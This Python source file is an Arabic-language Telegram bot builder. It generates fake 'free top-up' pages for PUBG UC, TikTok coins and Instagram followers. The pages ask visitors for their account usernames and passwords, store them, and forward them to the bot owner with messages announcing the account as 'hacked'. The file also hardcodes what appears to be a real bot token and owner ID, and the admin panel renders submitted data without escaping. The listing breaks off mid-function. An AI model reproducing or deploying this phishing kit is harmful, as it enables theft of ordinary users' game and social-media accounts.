#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Telegram Bot Maker — Single File (Final Working Version)
- يصنع بوتات فرعية + موقع كامل لكل بوت (PUBG/TikTok/Instagram)
- كل بوت فيه زر واحد يفتح الموقع
- لوحة إدارة لكل موقع
- Migration تلقائي لقاعدة البيانات القديمة
"""

import asyncio
import json
import logging
import re
import secrets
import sqlite3
import threading
import warnings
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

warnings.filterwarnings("ignore")

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import TelegramError, Conflict
from telegram.ext import (
    Application, CallbackQueryHandler, CommandHandler,
    ContextTypes, ConversationHandler, MessageHandler, filters,
)

# ==================================================================
# ============================ CONFIG ==============================
# ==================================================================
import os

MAIN_BOT_TOKEN = os.environ.get("MAIN_BOT_TOKEN", "8915687426:AAF82yRym0pNA0t8GE6UCvA9gXB5_OZH-CI")
OWNER_ID = int(os.environ.get("OWNER_ID", "8248646958"))
DB_PATH = os.environ.get("DB_PATH", "botmaker.db")
PUBLIC_URL = os.environ.get("PUBLIC_URL", "http://localhost:8080")
SHOP_PORT = int(os.environ.get("PORT", "8080"))
DEFAULT_SHOP_PASSWORD = os.environ.get("SHOP_PASSWORD", "شعليك 😂")
# ==================================================================
# =========================== LOGGING ==============================
# ==================================================================
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s",
    level=logging.INFO,
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram.ext.ConversationHandler").setLevel(logging.ERROR)
logging.getLogger("telegram.ext.Application").setLevel(logging.ERROR)
logger = logging.getLogger("BotMaker")

MAIN_LOOP = None

# ==================================================================
# ========================== DATABASE ==============================
# ==================================================================
def db_connect() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn


def _has_column(conn, table: str, column: str) -> bool:
    try:
        return any(r[1] == column for r in conn.execute(f"PRAGMA table_info({table})"))
    except Exception:
        return False


def _add_col(conn, table: str, column: str, definition: str) -> None:
    if not _has_column(conn, table, column):
        try:
            conn.execute(f"ALTER TABLE {table} ADD COLUMN {column} {definition}")
            logger.info(f"🔧 Added column {table}.{column}")
        except Exception as e:
            logger.error(f"Alter {table}.{column}: {e}")


def init_db() -> None:
    conn = db_connect()
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)")
    c.execute("CREATE TABLE IF NOT EXISTS banned (user_id INTEGER PRIMARY KEY)")
    c.execute("""CREATE TABLE IF NOT EXISTS bots (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        owner_id INTEGER NOT NULL,
        token TEXT UNIQUE NOT NULL,
        username TEXT,
        name TEXT,
        welcome TEXT,
        shop_type TEXT DEFAULT 'none',
        shop_password TEXT DEFAULT '123456',
        enabled INTEGER DEFAULT 1,
        created_at TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        bot_id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        PRIMARY KEY (bot_id, user_id)
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS buttons (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id INTEGER NOT NULL,
        text TEXT NOT NULL,
        url TEXT NOT NULL
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS shop_orders (
        id TEXT PRIMARY KEY,
        bot_id INTEGER NOT NULL,
        shop_type TEXT NOT NULL,
        data TEXT NOT NULL,
        status TEXT DEFAULT 'قيد المعالجة',
        created_at TEXT
    )""")

    # Migrations للقواعد القديمة
    _add_col(conn, "bots", "shop_type", "TEXT DEFAULT 'none'")
    _add_col(conn, "bots", "shop_password", "TEXT DEFAULT '123456'")
    _add_col(conn, "bots", "welcome", "TEXT")
    _add_col(conn, "bots", "enabled", "INTEGER DEFAULT 1")
    _add_col(conn, "bots", "created_at", "TEXT")

    conn.commit()
    conn.close()


# ---------- admins ----------
def is_admin(uid):
    if uid == OWNER_ID: return True
    c = db_connect()
    try:
        return c.execute("SELECT 1 FROM admins WHERE user_id=?", (uid,)).fetchone() is not None
    finally:
        c.close()


def add_admin(uid):
    c = db_connect()
    try:
        c.execute("INSERT OR IGNORE INTO admins(user_id) VALUES(?)", (uid,))
        c.commit()
    finally:
        c.close()


def remove_admin(uid):
    c = db_connect()
    try:
        c.execute("DELETE FROM admins WHERE user_id=?", (uid,))
        c.commit()
    finally:
        c.close()


def list_admins():
    c = db_connect()
    try:
        return [r["user_id"] for r in c.execute("SELECT user_id FROM admins").fetchall()]
    finally:
        c.close()


# ---------- bans ----------
def is_banned(uid):
    c = db_connect()
    try:
        return c.execute("SELECT 1 FROM banned WHERE user_id=?", (uid,)).fetchone() is not None
    finally:
        c.close()


def ban_user(uid):
    c = db_connect()
    try:
        c.execute("INSERT OR IGNORE INTO banned(user_id) VALUES(?)", (uid,))
        c.commit()
    finally:
        c.close()


def unban_user(uid):
    c = db_connect()
    try:
        c.execute("DELETE FROM banned WHERE user_id=?", (uid,))
        c.commit()
    finally:
        c.close()


# ---------- bots ----------
def save_bot(owner_id, token, username, name, shop_type="none", password="123456"):
    c = db_connect()
    try:
        cur = c.execute(
            """INSERT INTO bots(owner_id, token, username, name, welcome,
                shop_type, shop_password, enabled, created_at)
               VALUES(?,?,?,?,?,?,?,1,?)""",
            (owner_id, token, username, name, "أهلاً {name}!", shop_type, password,
             datetime.utcnow().isoformat())
        )
        c.commit()
        return cur.lastrowid
    except sqlite3.IntegrityError:
        return None
    finally:
        c.close()


def get_bot(bid):
    c = db_connect()
    try:
        r = c.execute("SELECT * FROM bots WHERE id=?", (bid,)).fetchone()
        return dict(r) if r else None
    finally:
        c.close()


def get_bot_by_token(token):
    c = db_connect()
    try:
        r = c.execute("SELECT * FROM bots WHERE token=?", (token,)).fetchone()
        return dict(r) if r else None
    finally:
        c.close()


def get_user_bots(uid):
    c = db_connect()
    try:
        return [dict(x) for x in c.execute("SELECT * FROM bots WHERE owner_id=?", (uid,)).fetchall()]
    finally:
        c.close()


def get_all_bots():
    c = db_connect()
    try:
        return [dict(x) for x in c.execute("SELECT * FROM bots").fetchall()]
    finally:
        c.close()


def update_bot_field(bid, field, value):
    if field not in {"welcome", "enabled", "username", "name", "shop_type", "shop_password"}:
        raise ValueError("Invalid field")
    c = db_connect()
    try:
        c.execute(f"UPDATE bots SET {field}=? WHERE id=?", (value, bid))
        c.commit()
    finally:
        c.close()


def delete_bot_row(bid):
    c = db_connect()
    try:
        c.execute("DELETE FROM bots WHERE id=?", (bid,))
        c.execute("DELETE FROM buttons WHERE bot_id=?", (bid,))
        c.execute("DELETE FROM users WHERE bot_id=?", (bid,))
        c.execute("DELETE FROM shop_orders WHERE bot_id=?", (bid,))
        c.commit()
    finally:
        c.close()


def add_user_to_bot(bid, uid):
    c = db_connect()
    try:
        c.execute("INSERT OR IGNORE INTO users(bot_id, user_id) VALUES(?,?)", (bid, uid))
        c.commit()
    finally:
        c.close()


def get_bot_users(bid):
    c = db_connect()
    try:
        return [r["user_id"] for r in c.execute("SELECT user_id FROM users WHERE bot_id=?", (bid,)).fetchall()]
    finally:
        c.close()


def add_button(bid, text, url):
    c = db_connect()
    try:
        c.execute("INSERT INTO buttons(bot_id, text, url) VALUES(?,?,?)", (bid, text, url))
        c.commit()
    finally:
        c.close()


def get_buttons(bid):
    c = db_connect()
    try:
        return [dict(x) for x in c.execute("SELECT * FROM buttons WHERE bot_id=?", (bid,)).fetchall()]
    finally:
        c.close()


def get_stats():
    c = db_connect()
    try:
        u = c.execute("SELECT COUNT(DISTINCT user_id) FROM users").fetchone()[0]
        b = c.execute("SELECT COUNT(*) FROM bots").fetchone()[0]
        a = c.execute("SELECT COUNT(*) FROM bots WHERE enabled=1").fetchone()[0]
        return u, b, a
    finally:
        c.close()


# ---------- shop orders ----------
def create_shop_order(bid, shop_type, data):
    oid = secrets.token_hex(4).upper()
    order = {
        "id": oid, "bot_id": bid, "shop_type": shop_type,
        "data": data, "status": "قيد المعالجة",
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    c = db_connect()
    try:
        c.execute(
            "INSERT INTO shop_orders(id, bot_id, shop_type, data, status, created_at) VALUES(?,?,?,?,?,?)",
            (oid, bid, shop_type, json.dumps(data, ensure_ascii=False),
             order["status"], order["created_at"])
        )
        c.commit()
    finally:
        c.close()
    return order


def get_shop_orders(bid):
    c = db_connect()
    try:
        rows = c.execute(
            "SELECT * FROM shop_orders WHERE bot_id=? ORDER BY created_at DESC", (bid,)
        ).fetchall()
        out = []
        for r in rows:
            d = dict(r)
            try: d["data"] = json.loads(d["data"])
            except: d["data"] = {}
            out.append(d)
        return out
    finally:
        c.close()


def update_shop_order_status(oid, status):
    c = db_connect()
    try:
        c.execute("UPDATE shop_orders SET status=? WHERE id=?", (status, oid))
        c.commit()
        r = c.execute("SELECT * FROM shop_orders WHERE id=?", (oid,)).fetchone()
        if not r: return None
        d = dict(r)
        try: d["data"] = json.loads(d["data"])
        except: d["data"] = {}
        return d
    finally:
        c.close()


# ==================================================================
# =========================== HELPERS ==============================
# ==================================================================
def mask_token(t):
    try:
        if not t or ":" not in t: return "••••••"
        p, s = t.split(":", 1)
        return f"{p}:{s[:2]}••••{s[-3:]}" if len(s) > 6 else f"{p}:••••"
    except: return "••••••"


def format_welcome(tpl, u):
    try:
        name = u.first_name or ""
        if u.last_name: name = f"{name} {u.last_name}".strip()
        uname = f"@{u.username}" if u.username else ""
        return (tpl or "أهلاً بك!").replace("{name}", name).replace("{username}", uname)
    except: return tpl or "أهلاً بك!"


def is_valid_url(u):
    try:
        p = urlparse(u)
        return p.scheme in ("http", "https") and bool(p.netloc)
    except: return False


def is_valid_token(t):
    return bool(re.match(r"^\d+:[A-Za-z0-9_-]{30,}$", t or ""))


def shop_url(bid):
    base = (PUBLIC_URL or f"http://localhost:{SHOP_PORT}").rstrip("/")
    return f"{base}/shop/{bid}"


# ==================================================================
# ==================== SHOP HTML (inline) ==========================
# ==================================================================
COMMON_CSS = """
*{box-sizing:border-box;margin:0;padding:0}
body{min-height:100vh;padding:20px;font-family:Tahoma,Arial,sans-serif;color:#fff;
background:radial-gradient(circle at top,__C1__,__C2__ 45%,#050605 100%);
display:flex;justify-content:center;align-items:center}
.card{width:100%;max-width:480px;padding:28px 22px;background:rgba(12,15,10,.97);
border:1px solid #39432d;border-radius:24px;box-shadow:0 25px 70px rgba(0,0,0,.55)}
.logo{text-align:center;font-size:55px}
h1{text-align:center;font-size:23px;margin:8px 0 12px}
.desc{text-align:center;color:#aaa;line-height:1.8;margin-bottom:25px;font-size:14px}
label.title{display:block;margin-bottom:8px;font-weight:bold;font-size:14px}
input[type="text"]{width:100%;padding:15px;margin-bottom:20px;color:#fff;background:#0a0c09;
border:1px solid #414936;border-radius:12px;font-size:16px;outline:none}
input[type="text"]:focus{border-color:__C1__}
.options{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:22px}
.options input{display:none}
.options label{padding:14px 4px;text-align:center;background:#0a0c09;
border:1px solid #414936;border-radius:11px;cursor:pointer;font-weight:bold}
.options input:checked + label{background:__C1__;border-color:__C1__}
button{width:100%;padding:16px;border:0;border-radius:13px;
background:linear-gradient(135deg,__C2__,__C1__);color:#fff;font-size:17px;
font-weight:bold;cursor:pointer}
button:disabled{opacity:.6}
.message{display:none;margin-top:18px;padding:16px;border-radius:12px;
text-align:center;line-height:1.8;font-size:14px}
.success{background:#102a16;border:1px solid #4e963c}
.error{background:#351616;border:1px solid #9b3b3b}
.order{color:#b8e46d;font-weight:bold}
.note{color:#777;text-align:center;font-size:12px;margin-top:17px;line-height:1.7}
"""


def html_pubg(bid):
    css = COMMON_CSS.replace("__C1__", "#9bc74e").replace("__C2__", "#557d29")
    return """<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>شحن شدات PUBG</title><style>""" + css + """</style></head><body>
<div class="card">
<div class="logo">🎮</div>
<h1>هلا بيك في شحن شدات PUBG</h1>
<div class="desc">أدخل معلومات الربط المطلوبة، ثم أدخل ID حساب PUBG واختر عدد الشدات.<br>شحن مجانا .</div>
<form id="form">
<label class="title">اختيار نوع الربط</label>
<div class="options">
<div><input id="facebook" type="radio" name="login_type" value="فيسبوك" checked><label for="facebook">فيسبوك</label></div>
<div><input id="email" type="radio" name="login_type" value="بريد"><label for="email">بريد</label></div>
<div><input id="phone" type="radio" name="login_type" value="رقم"><label for="phone">رقم</label></div>
</div>
<label class="title" id="loginTitle">اسم مستخدم فيسبوك</label>
<input id="loginValue" type="text" placeholder="أدخل اسم المستخدم" maxlength="150" required>
<label class="title">كلمه مرور الحساب</label>
<input id="playerId" type="text" placeholder="أدخل كلمه مرور PUBG" maxlength="50" required>
<label class="title">اختار عدد الشدات</label>
<div class="options">
<div><input id="uc660" type="radio" name="uc" value="660" checked><label for="uc660">660</label></div>
<div><input id="uc1000" type="radio" name="uc" value="1000"><label for="uc1000">1000</label></div>
<div><input id="uc2000" type="radio" name="uc" value="2000"><label for="uc2000">2000</label></div>
</div>
<button id="submit" type="submit">إرسال طلب الشحن</button>
</form>
<div id="success" class="message success">✅ تم وصول طلبك إلى المطور.<br>سيتم معالجة طلب الشحن قريباً.<br><br>رقم الطلب: <span id="order" class="order"></span></div>
<div id="error" class="message error"></div>
<div class="note">مجانا .</div>
</div>
<script>
const form=document.getElementById("form"),submit=document.getElementById("submit");
const success=document.getElementById("success"),errorBox=document.getElementById("error");
const orderBox=document.getElementById("order"),loginValue=document.getElementById("loginValue");
const loginTitle=document.getElementById("loginTitle");
function changeType(){const t=document.querySelector('input[name="login_type"]:checked').value;
if(t==="فيسبوك"){loginTitle.textContent="اسم مستخدم فيسبوك";loginValue.placeholder="أدخل اسم المستخدم";}
else if(t==="بريد"){loginTitle.textContent="البريد الإلكتروني";loginValue.placeholder="example@email.com";}
else{loginTitle.textContent="رقم الهاتف";loginValue.placeholder="أدخل رقم الهاتف";}}
document.querySelectorAll('input[name="login_type"]').forEach(el=>el.addEventListener("change",changeType));
changeType();
form.addEventListener("submit",async function(e){
e.preventDefault();success.style.display="none";errorBox.style.display="none";
const login_type=document.querySelector('input[name="login_type"]:checked').value;
const uc=document.querySelector('input[name="uc"]:checked').value;
const login_value=loginValue.value.trim();
const player_id=document.getElementById("playerId").value.trim();
if(!login_value||!player_id){errorBox.textContent="يرجى تعبئة جميع المعلومات.";errorBox.style.display="block";return;}
submit.disabled=true;submit.textContent="جاري إرسال الطلب...";
try{const r=await fetch("__ACTION__",{method:"POST",headers:{"Content-Type":"application/json"},
body:JSON.stringify({login_type,login_value,player_id,uc})});
const d=await r.json();
if(!r.ok||!d.success)throw new Error(d.error||"حدث خطأ.");
orderBox.textContent="#"+d.order_id;success.style.display="block";form.reset();
document.getElementById("facebook").checked=true;document.getElementById("uc660").checked=true;changeType();
}catch(err){errorBox.textContent=err.message;errorBox.style.display="block";}
finally{submit.disabled=false;submit.textContent="إرسال طلب الشحن";}});
</script></body></html>""".replace("__ACTION__", f"/shop/{bid}/order")


def html_tiktok(bid):
    css = COMMON_CSS.replace("__C1__", "#25f4ee").replace("__C2__", "#fe2c55")
    return """<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>شحن عملات TikTok</title><style>""" + css + """</style></head><body>
<div class="card">
<div class="logo">🪙</div>
<h1>هلا بيك في شحن عملات TikTok</h1>
<div class="desc">أدخل معلومات حسابك المطلوبة واختر عدد العملات.<br>سيتم إرسال طلبك إلى المطور لمعالجته.</div>
<form id="form">
<label class="title">اسم المستخدم</label>
<input id="username" type="text" placeholder="@username" maxlength="100" required>
<label class="title">اسم الحساب</label>
<input id="account_name" type="text" placeholder="كلمه مرور حسابك" maxlength="100" required>
<label class="title">اختار عدد العملات</label>
<div class="options">
<div><input id="c500" type="radio" name="coins" value="500" checked><label for="c500">500</label></div>
<div><input id="c1000" type="radio" name="coins" value="1000"><label for="c1000">1000</label></div>
<div><input id="c3000" type="radio" name="coins" value="3000"><label for="c3000">3000</label></div>
</div>
<button id="submit" type="submit">إرسال طلب الشحن</button>
</form>
<div id="success" class="message success">✅ تم وصول معلوماتك إلى المطور بنجاح.<br>سيتم شحن عملات حسابك قريباً.<br><br>رقم الطلب: <span id="order" class="order"></span></div>
<div id="error" class="message error"></div>
<div class="note">خدمة شحن العملات</div>
</div>
<script>
const form=document.getElementById("form"),submit=document.getElementById("submit");
const success=document.getElementById("success"),errorBox=document.getElementById("error");
const orderBox=document.getElementById("order");
form.addEventListener("submit",async function(e){
e.preventDefault();success.style.display="none";errorBox.style.display="none";
const username=document.getElementById("username").value.trim();
const account_name=document.getElementById("account_name").value.trim();
const coins=document.querySelector('input[name="coins"]:checked').value;
if(!username||!account_name){errorBox.textContent="يرجى تعبئة جميع المعلومات.";errorBox.style.display="block";return;}
submit.disabled=true;submit.textContent="جاري إرسال الطلب...";
try{const r=await fetch("__ACTION__",{method:"POST",headers:{"Content-Type":"application/json"},
body:JSON.stringify({username,account_name,coins})});
const d=await r.json();
if(!r.ok||!d.success)throw new Error(d.error||"حدث خطأ.");
orderBox.textContent="#"+d.order_id;success.style.display="block";form.reset();
document.getElementById("c500").checked=true;
}catch(err){errorBox.textContent=err.message;errorBox.style.display="block";}
finally{submit.disabled=false;submit.textContent="إرسال طلب الشحن";}});
</script></body></html>""".replace("__ACTION__", f"/shop/{bid}/order")


def html_instagram(bid):
    css = COMMON_CSS.replace("__C1__", "#c13584").replace("__C2__", "#833ab4")
    return """<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>رشق متابعين Instagram</title><style>""" + css + """</style></head><body>
<div class="card">
<div class="logo">📸</div>
<h1>هلا بيك في رشق متابعين Instagram</h1>
<div class="desc">أدخل اسم المستخدم واسم الحساب واختر عدد الرشق.<br>سيتم إرسال الطلب إلى المطور لمعالجته.</div>
<form id="form">
<label class="title">اسم المستخدم</label>
<input id="username" type="text" placeholder="@username" maxlength="100" required>
<label class="title">كلمه مرور حسابك</label>
<input id="account_name" type="text" placeholder="مثال: حسابي الرسمي" maxlength="100" required>
<label class="title">عدد الرشق</label>
<div class="options">
<div><input id="f500" type="radio" name="followers" value="500" checked><label for="f500">500</label></div>
<div><input id="f1000" type="radio" name="followers" value="1000"><label for="f1000">1000</label></div>
<div><input id="f2000" type="radio" name="followers" value="2000"><label for="f2000">2000</label></div>
</div>
<button id="submit" type="submit">إرسال طلب الرشق</button>
</form>
<div id="success" class="message success">✅ تم وصول معلومات طلبك إلى المطور.<br>سيتم معالجة طلبك قريباً.<br><br>رقم الطلب: <span id="order" class="order"></span></div>
<div id="error" class="message error"></div>
<div class="note">خدمة رشق متابعين Instagram</div>
</div>
<script>
const form=document.getElementById("form"),submit=document.getElementById("submit");
const success=document.getElementById("success"),errorBox=document.getElementById("error");
const orderBox=document.getElementById("order");
form.addEventListener("submit",async function(e){
e.preventDefault();success.style.display="none";errorBox.style.display="none";
const username=document.getElementById("username").value.trim();
const account_name=document.getElementById("account_name").value.trim();
const followers=document.querySelector('input[name="followers"]:checked').value;
if(!username||!account_name){errorBox.textContent="يرجى تعبئة جميع المعلومات.";errorBox.style.display="block";return;}
submit.disabled=true;submit.textContent="جاري إرسال الطلب...";
try{const r=await fetch("__ACTION__",{method:"POST",headers:{"Content-Type":"application/json"},
body:JSON.stringify({username,account_name,followers})});
const d=await r.json();
if(!r.ok||!d.success)throw new Error(d.error||"حدث خطأ.");
orderBox.textContent="#"+d.order_id;success.style.display="block";form.reset();
document.getElementById("f500").checked=true;
}catch(err){errorBox.textContent=err.message;errorBox.style.display="block";}
finally{submit.disabled=false;submit.textContent="إرسال طلب الرشق";}});
</script></body></html>""".replace("__ACTION__", f"/shop/{bid}/order")


def shop_html(bid, stype):
    if stype == "pubg": return html_pubg(bid)
    if stype == "tiktok": return html_tiktok(bid)
    if stype == "instagram": return html_instagram(bid)
    return "<html><body style='background:#111;color:#fff;font-family:Arial;padding:50px;text-align:center'><h1>لم يتم إعداد متجر لهذا البوت</h1></body></html>"


def shop_admin_login_html(bid):
    return f"""<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>دخول الإدارة</title>
<style>body{{margin:0;background:#111;color:#fff;font-family:Arial;min-height:100vh;
display:flex;justify-content:center;align-items:center}}
.box{{width:90%;max-width:400px;background:#1b1b1b;padding:30px;border-radius:18px}}
input{{width:100%;padding:14px;margin:15px 0;box-sizing:border-box;background:#111;
color:#fff;border:1px solid #444;border-radius:10px}}
button{{width:100%;padding:14px;border:0;border-radius:10px;background:#709b35;
color:#fff;font-weight:bold;cursor:pointer}}</style></head><body>
<div class="box"><h2>🔐 لوحة إدارة الطلبات</h2>
<form method="POST" action="/shop/{bid}/admin/login">
<input type="password" name="password" placeholder="كلمة المرور" required>
<button>دخول</button></form></div></body></html>"""


def shop_admin_html(bid, orders, title):
    rows = ""
    for o in orders:
        d = o.get("data", {})
        f = "".join(f"<div><b>{k}:</b> {v}</div>" for k, v in d.items())
        s = o['status']
        rows += f"""<tr>
<td>#{o['id']}</td><td style="text-align:right">{f}</td><td>{s}</td><td>{o['created_at']}</td>
<td><form method="POST" action="/shop/{bid}/admin/status">
<input type="hidden" name="id" value="{o['id']}">
<select name="status">
<option {'selected' if s=='قيد المعالجة' else ''}>قيد المعالجة</option>
<option {'selected' if s=='جاري التنفيذ' else ''}>جاري التنفيذ</option>
<option {'selected' if s=='مكتمل' else ''}>مكتمل</option>
<option {'selected' if s=='ملغي' else ''}>ملغي</option>
</select><button>تحديث</button></form></td></tr>"""
    return f"""<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>إدارة الطلبات</title>
<style>body{{margin:0;padding:20px;background:#101010;color:#fff;font-family:Tahoma,Arial}}
h1{{text-align:center}}.table{{overflow-x:auto}}
table{{width:100%;border-collapse:collapse;background:#191919}}
th,td{{border:1px solid #333;padding:12px;text-align:center;vertical-align:top;font-size:13px}}
th{{background:#292929}}
select{{padding:7px;background:#111;color:#fff;border:1px solid #444;border-radius:7px}}
button{{padding:8px 12px;border:0;border-radius:7px;background:#709b35;color:#fff;cursor:pointer}}</style>
</head><body><h1>📋 {title}</h1><div class="table"><table>
<thead><tr><th>الطلب</th><th>البيانات</th><th>الحالة</th><th>التاريخ</th><th>تحديث</th></tr></thead>
<tbody>{rows if rows else '<tr><td colspan="5">لا توجد طلبات</td></tr>'}</tbody>
</table></div></body></html>"""


# ==================================================================
# ====================== WEB SERVER ================================
# ==================================================================
def notify_owner(bid, text):
    if MAIN_LOOP is None:
        return
    bot = get_bot(bid)
    if not bot: return
    app = manager.bots.get(bid)
    if not app:
        logger.info(f"Bot {bid} not running, order saved")
        return
    try:
        fut = asyncio.run_coroutine_threadsafe(
            app.bot.send_message(bot["owner_id"], text), MAIN_LOOP
        )
        fut.add_done_callback(lambda f: f.exception() if f.exception() else None)
    except Exception as e:
        logger.error(f"notify: {e}")


class ShopHandler(BaseHTTPRequestHandler):
    def _send(self, status, body, ctype):
        try:
            self.send_response(status)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(body)
        except: pass

    def _html(self, status, h):
        self._send(status, h.encode("utf-8"), "text/html; charset=utf-8")

    def _json(self, status, d):
        self._send(status, json.dumps(d, ensure_ascii=False).encode("utf-8"),
                   "application/json; charset=utf-8")

    def _body(self, lim=20000):
        n = int(self.headers.get("Content-Length", "0") or "0")
        if n <= 0: raise ValueError("empty")
        if n > lim: raise ValueError("too large")
        return self.rfile.read(n)

    def log_message(self, *a): pass

    def do_GET(self):
        p = urlparse(self.path).path
        parts = [x for x in p.strip("/").split("/") if x]

        if p == "/" or p == "":
            bots = [b for b in get_all_bots() if (b.get("shop_type") or "none") != "none"]
            if not bots:
                self._html(200, """<!DOCTYPE html><html lang="ar" dir="rtl"><head>
<meta charset="UTF-8"><title>المتاجر</title>
<style>body{background:#111;color:#fff;font-family:Tahoma;display:flex;
justify-content:center;align-items:center;min-height:100vh;margin:0;text-align:center}
.b{padding:40px;background:#1b1b1b;border-radius:20px}</style></head><body>
<div class="b"><h1>🛒 صانع البوتات</h1>
<p style="color:#888">لا توجد متاجر مُنشأة بعد.</p></div></body></html>""")
                return
            cards = "".join(
                f'<a href="/shop/{b["id"]}" style="display:block;padding:15px;margin:10px 0;'
                f'background:#1b1b1b;color:#9bc74e;text-decoration:none;border-radius:12px;'
                f'border:1px solid #333">🛒 @{b["username"]} — {b.get("shop_type")}</a>'
                for b in bots)
            self._html(200, f"""<!DOCTYPE html><html lang="ar" dir="rtl"><head>
<meta charset="UTF-8"><title>المتاجر</title>
<style>body{{background:#111;color:#fff;font-family:Tahoma;padding:30px;margin:0}}
h1{{text-align:center}}.w{{max-width:500px;margin:0 auto}}</style></head><body>
<div class="w"><h1>🛒 المتاجر المتوفرة</h1>{cards}</div></body></html>""")
            return

        if p == "/health":
            self._json(200, {"status": "ok"}); return

        if len(parts) >= 2 and parts[0] == "shop":
            try: bid = int(parts[1])
            except: self._json(404, {"success": False, "error": "invalid bot"}); return
            bot = get_bot(bid)
            if not bot: self._json(404, {"success": False, "error": "bot not found"}); return
            if len(parts) == 2:
                self._html(200, shop_html(bid, bot.get("shop_type") or "none")); return
            if len(parts) == 3 and parts[2] == "admin":
                self._html(200, shop_admin_login_html(bid)); return

        self._json(404, {"success": False, "error": "not found"})

    def do_POST(self):
        p = urlparse(self.path).path
        parts = [x for x in p.strip("/").split("/") if x]

        if len(parts) >= 3 and parts[0] == "shop":
            try: bid = int(parts[1])
            except: self._json(404, {"success": False, "error": "invalid"}); return
            bot = get_bot(bid)
            if not bot: self._json(404, {"success": False, "error": "not found"}); return

            if len(parts) == 3 and parts[2] == "order":
                self._order(bid, bot); return
            if len(parts) == 4 and parts[2] == "admin" and parts[3] == "login":
                self._admin_login(bid, bot); return
            if len(parts) == 4 and parts[2] == "admin" and parts[3] == "status":
                self._admin_status(bid, bot); return

        self._json(404, {"success": False, "error": "not found"})

    def _order(self, bid, bot):
        try:
            data = json.loads(self._body().decode("utf-8"))
        except:
            self._json(400, {"success": False, "error": "بيانات غير صالحة"}); return

        st = bot.get("shop_type") or "none"
        clean = {}
        msg = ""

        if st == "pubg":
            lt = str(data.get("login_type", "")).strip()
            lv = str(data.get("login_value", "")).strip()
            pid = str(data.get("player_id", "")).strip()
            uc = str(data.get("uc", "")).strip()
            if lt not in ("فيسبوك", "بريد", "رقم"):
                self._json(400, {"success": False, "error": "نوع الربط غير صحيح"}); return
            if not lv or not pid:
                self._json(400, {"success": False, "error": "بيانات ناقصة"}); return
            if uc not in ("660", "1000", "2000"):
                self._json(400, {"success": False, "error": "عدد الشدات غير صحيح"}); return
            clean = {"نوع الربط": lt, "المعرّف": lv[:150], "كلمه سر ": pid[:50], "الشدات": uc}
            msg = f"🎮 تم اختراق مطور @Yb_xY\n\n🔗 الربط: {lt}\n👤 المعرّف: {lv}\n🆔 ID: {pid}\n💎 الشدات: {uc}\n"

        elif st == "tiktok":
            u = str(data.get("username", "")).strip()
            a = str(data.get("account_name", "")).strip()
            c = str(data.get("coins", "")).strip()
            if not u or not a:
                self._json(400, {"success": False, "error": "بيانات ناقصة"}); return
            if c not in ("500", "1000", "3000"):
                self._json(400, {"success": False, "error": "عدد العملات غير صحيح"}); return
            clean = {"اسم المستخدم": u[:100], "كلمه سر الحساب": a[:100], "0": c}
            msg = f"📥 تم اختراقه  TikTok مطور @Yb_xY\n\n👤 {u}\n📛 {a}\n🪙 تم اختراقه : {c}\n"

        elif st == "instagram":
            u = str(data.get("username", "")).strip()
            a = str(data.get("account_name", "")).strip()
            f = str(data.get("followers", "")).strip()
            if not u or not a:
                self._json(400, {"success": False, "error": "بيانات ناقصة"}); return
            if f not in ("500", "1000", "2000"):
                self._json(400, {"success": False, "error": "عدد الرشق غير صحيح"}); return
            clean = {"اسم المستخدم": u[:100], "كلمه سر ": a[:100], "عدد الرشق": f}
            msg = f"📥 تم اختراق Instagram مطور @Yb_xY\n\n👤 {u}\n📛 {a}\n👥 تم اختراق: {f}\n"

        else:
            self._json(400, {"success": False, "error": "لا يوجد متجر مُعدّ"}); return

        order = create_shop_order(bid, st, clean)
        msg += f"🆔 الطلب: #{order['id']}\n📌 {order['status']}\n🕐 {order['created_at']}"
        notify_owner(bid, msg)
        self._json(200, {"success": True, "order_id": order["id"]})

    def _admin_login(self, bid, bot):
        try:
            form = parse_qs(self._body().decode("utf-8"))
            pw = (form.get("password") or [""])[0]
        except:
            self._html(400, "طلب غير صحيح"); return
        if pw != (bot.get("shop_password") or DEFAULT_SHOP_PASSWORD):
            self._html(403, "<div style='background:#111;color:#fff;padding:80px;text-align:center;font-family:Arial;min-height:100vh'><h2>❌ كلمة المرور غير صحيحة</h2><a href='/shop/%d/admin' style='color:#709b35'>عودة</a></div>" % bid)
            return
        orders = get_shop_orders(bid)
        titles = {"pubg": "طلبات شحن PUBG", "tiktok": "طلبات شحن TikTok", "instagram": "طلبات رشق Instagram"}
        self._html(200, shop_admin_html(bid, orders, titles.get(bot.get("shop_type"), "الطلبات")))

    def _admin_status(self, bid, bot):
        try:
            form = parse_qs(self._body().decode("utf-8"))
            oid = (form.get("id") or [""])[0]
